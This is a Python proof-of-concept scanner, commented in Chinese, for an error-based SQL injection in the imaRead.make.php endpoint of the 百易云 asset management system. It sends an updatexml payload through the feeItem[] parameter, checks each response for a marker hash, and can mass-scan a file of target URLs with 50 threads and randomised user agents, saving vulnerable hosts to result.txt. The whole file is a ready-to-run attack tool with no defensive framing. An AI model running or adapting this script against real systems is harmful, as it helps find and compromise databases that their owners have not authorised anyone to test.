#百易云资管系统imaRead.make.php SQL注入  
import requests,argparse,sys,re,json,random
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() 
def poc(target):
    payload="/adminx/imaRead.make.php?act=remake"
    user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]
    headers1={
        "User-Agent": random.choice(user_agents),
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    hearders2={
        "User-Agent":"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept-Encoding":"gzip, deflate",
        "Accept":"*/*",
        "Connection":"close",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    data="""feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(1)),1)"""
    try:
        res1=requests.get(url=target,timeout=5,verify=False,headers=headers1)
        if res1.status_code ==200:
            res2=requests.post(url=target+payload,timeout=5,data=data,verify=False,headers=hearders2)
            if 'c4ca4238a0b923820dcc509a6f75849' in res2.text:
                print(f"[+]{target}存在sql注入")
                with open('result.txt','a',encoding='utf-8')as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]{target}不存在sql注入")
        else:
            print(f"[*]{target}访问有问题，请手工访问")
    except:
        pass
def banner():
    pass
def main():
    parse=argparse.ArgumentParser(description="百易云资管系统imaRead.make.php SQL注入 ")
    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file path')
    args=parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        mp=Pool(50)
        mp.map(poc,url_list)
        mp.close
        mp.join
        
    else:
        print(f"Usage: Python {sys.argv[0]}  -h")

if __name__ =="__main__":
    main()
